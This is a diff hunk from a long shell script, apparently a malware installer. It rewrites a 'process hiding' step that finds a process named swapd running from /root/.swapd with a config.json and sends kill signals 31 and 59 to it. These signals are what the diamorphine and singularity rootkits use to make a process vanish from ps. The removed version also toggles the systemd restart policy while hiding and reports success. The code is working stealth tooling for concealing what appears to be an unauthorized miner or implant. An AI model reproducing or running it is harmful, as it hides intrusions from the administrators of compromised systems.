@@ -3422,85 +3422,16 @@ echo ""
 exit 0
 
 # ==================== FINAL PROCESS HIDING (AGGRESSIVE APPROACH) ====================
-echo ""
-echo "=========================================="
-echo "FINAL STEP: HIDING SWAPD PROCESS"
-echo "=========================================="
-echo ""
-
-# Download and run the force-hide script
-echo "[*] Running comprehensive hide script..."
-echo ""
-
-# Inline the force-hide logic here
-SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
-if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
-    SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' | head -1)
-fi
-
-if [ -n "$SWAPD_PID" ]; then
-    echo "[✓] Found swapd PID: $SWAPD_PID"
-    
-    # Check for rootkits
-    if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
-        echo "[✓] Rootkits detected"
-        echo ""
-        
-        # Temporarily disable auto-restart to prevent PID changes
-        echo "[*] Temporarily disabling auto-restart..."
-        systemctl set-property swapd.service Restart=no 2>/dev/null || true
-        sleep 2
-        
-        # Try hiding with multiple attempts
-        echo "[*] Attempting to hide process..."
-        for attempt in 1 2 3 4 5; do
-            CURRENT_PID=$(pgrep -f '/root/.swapd/swapd' | head -1)
-            
-            if [ -n "$CURRENT_PID" ]; then
-                kill -31 $CURRENT_PID 2>/dev/null
-                kill -59 $CURRENT_PID 2>/dev/null
-                sleep 3
-                
-                # Check if hidden
-                if ! ps -p $CURRENT_PID >/dev/null 2>&1; then
-                    echo "[✓] Process hidden on attempt $attempt!"
-                    break
-                fi
-            fi
-        done
-        
-        # Re-enable auto-restart
-        echo "[*] Re-enabling auto-restart..."
-        systemctl set-property swapd.service Restart=always 2>/dev/null || true
-        
-        # Final verification
-        sleep 2
-        VISIBLE=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
-        
-        if [ -z "$VISIBLE" ]; then
-            echo ""
-            echo "=========================================="
-            echo "[✓] SUCCESS! SWAPD IS NOW HIDDEN!"
-            echo "=========================================="
-            echo ""
-        else
-            echo ""
-            echo "=========================================="
-            echo "[!] PROCESS STILL VISIBLE"
-            echo "=========================================="
-            echo ""
-            echo "Run this to hide manually:"
-            echo "  bash force_hide_swapd.sh"
-            echo ""
-        fi
-    else
-        echo "[!] No rootkits loaded - cannot hide process"
-        echo "[*] Load a rootkit first, then run:"
-        echo "    bash force_hide_swapd.sh"
-    fi
-else
-    echo "[!] swapd is not running"
-fi
+ps ax|grep swapd
+sleep 5
+kill -31 $(pgrep -f -u root config.json)
+kill -59 $(pgrep -f -u root config.json)
+kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+kill -59 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+kill -31 $(systemctl show --property MainPID --value swapd.service 2>/dev/null)
+kill -59 $(systemctl show --property MainPID --value swapd.service 2>/dev/null)
+sleep 5
+ps ax|grep swapd
 
 echo ""
 echo "=========================================="
